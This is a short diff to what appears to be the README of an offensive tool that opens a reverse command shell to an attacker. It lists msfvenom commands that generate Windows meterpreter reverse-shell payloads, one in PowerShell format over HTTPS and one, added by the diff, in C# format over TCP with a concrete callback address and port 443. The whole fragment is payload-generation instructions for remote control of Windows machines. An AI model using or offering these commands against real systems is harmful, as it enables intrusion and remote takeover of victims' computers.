@@ -8,3 +8,6 @@ It contains all the code needed to open up a reverse command shell to an attacke
 
 For ps1:
 sudo msfvenom -p windows/meterpreter_reverse_https LHOST=<lport> LPORT=<lport> EXITFUNC=thread -f ps1
+
+For C#
+ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
